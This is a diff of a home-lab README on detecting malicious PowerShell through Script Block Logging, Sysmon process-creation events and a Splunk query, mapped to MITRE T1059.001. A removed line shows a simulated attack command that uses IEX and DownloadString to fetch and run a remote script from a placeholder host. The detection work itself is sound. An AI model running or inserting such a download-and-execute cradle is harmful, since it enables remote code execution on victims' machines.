@@ -1,106 +1,115 @@
-# 🚨 Suspicious PowerShell Activity Detection
+# ⚡ Suspicious PowerShell Activity Detection
 
-## 📌 Scenario
+Detection of suspicious PowerShell execution using Script Block Logging and Sysmon.
 
-Simulated execution of a malicious PowerShell command after initial access.
+---
 
-The attacker attempts to download and execute a remote script using PowerShell.
+## 🎯 Objective
+
+Detect execution of potentially malicious PowerShell commands indicating remote code execution or initial compromise.
 
 ---
 
 ## ⚔️ Attack Simulation
 
-* Tool: PowerShell
-* Technique: Remote script execution
+- Tool: PowerShell
+- Victim: Windows
 
-**Command used:**
-powershell -Command "IEX(New-Object Net.WebClient).DownloadString('http://malicious.com/payload.ps1')"
+### Steps:
+
+1. Execute suspicious PowerShell command
+2. Command uses IEX / DownloadString
+3. Remote script or payload is executed
 
 ---
 
 ## 📊 Logs Analysis
 
-### PowerShell Script Execution (Event ID 4104)
+### PowerShell Event ID 4104 – Script Block Logging
 
-PowerShell Script Block Logging captured the executed command.
+- Full command execution captured
+- Script content visibility
 
-Key indicators:
-
-* Use of `IEX` (Invoke-Expression)
-* Use of `DownloadString` to fetch remote content
-* External URL reference
-* Potential execution of remote code
-
----
-
-### Process Execution (Sysmon Event ID 1)
-
-Sysmon logs show PowerShell process creation with full command line.
-
-Key indicators:
-
-* Execution of `powershell.exe`
-* Suspicious command line arguments
-* Use of remote script download technique
-* Visibility of full attack chain in command line
+**Indicators:**
+- `IEX`
+- `DownloadString`
+- External URL
 
 ---
 
-## 🧠 Detection Logic
+### Sysmon Event ID 1 – Process Creation
+
+- Process: `powershell.exe`
+- Suspicious command-line arguments
+
+**Why suspicious:**
+PowerShell used to execute remote or obfuscated code
+
+---
+
+## 🚨 Detection Logic
 
 Suspicious PowerShell activity is identified when:
 
-* Event ID 4104 contains `IEX` or `DownloadString`
-* Command includes external URL
-* PowerShell executes encoded or remote content
-* Sysmon Event ID 1 shows suspicious command line execution
+- Event ID 4104 contains:
+  - `IEX`
+  - `DownloadString`
+- External URL present
+- Sysmon Event ID 1 shows suspicious command execution
 
 ---
 
-## 🔍 Investigation Findings
+## 🔎 Investigation Findings
 
-* User: labuser
-* Process: powershell.exe
-* Technique: remote script execution via PowerShell
-* Indicators:
-  * IEX usage
-  * External URL (payload download)
-* Outcome: potentially malicious script execution attempt
+- User: labuser
+- Process: powershell.exe
 
----
+**Indicators:**
+- IEX execution  
+- External URL  
+- Potential payload execution  
 
-## 🚨 Conclusion
-
-Detected suspicious PowerShell activity indicating possible execution of remote malicious code.
+**Outcome:**
+Execution of remote PowerShell script
 
 ---
 
-## 🛡️ Recommended Actions
+## 🧬 MITRE ATT&CK Mapping
 
-* Block suspicious domains / URLs
-* Restrict PowerShell usage (e.g. Constrained Language Mode)
-* Enable advanced logging (Script Block Logging, Sysmon)
-* Monitor PowerShell activity for anomalies
-* Apply endpoint protection and EDR rules
+- **T1059.001** – PowerShell  
+
+---
+
+## 🔎 Detection Queries (Splunk)
+
+### Suspicious PowerShell
+
+EventCode=4104 AND ("IEX" OR "DownloadString")
 
 ---
 
 ## 📸 Evidence
 
-The screenshots below present evidence of the PowerShell attack and its detection.
+### PowerShell Execution
+![Execution](screenshots/powershell_execution.png)
 
-### PowerShell Attack Execution
+### Script Block Logging (Event ID 4104)
+![4104](screenshots/event_4104_script_block.png)
 
-![PowerShell Attack](screenshots/powershell_attack.png)
-
----
-
-### PowerShell Script Block (Event ID 4104)
-
-![Event 4104 Details](screenshots/event_4104_details.png)
+### Process Creation (Event ID 1)
+![Sysmon 1](screenshots/event_1_powershell_process.png)
 
 ---
 
-### Sysmon Process Creation (Event ID 1)
+## 🧠 Conclusion
 
-![Sysmon PowerShell](screenshots/sysmon_powershell.png)
+Suspicious PowerShell activity detected using script block logging and process monitoring.
+
+---
+
+## 🚀 Key Takeaways
+
+- PowerShell is commonly abused by attackers  
+- Script Block Logging provides deep visibility  
+- Detection should focus on behavior, not just keywords  
+
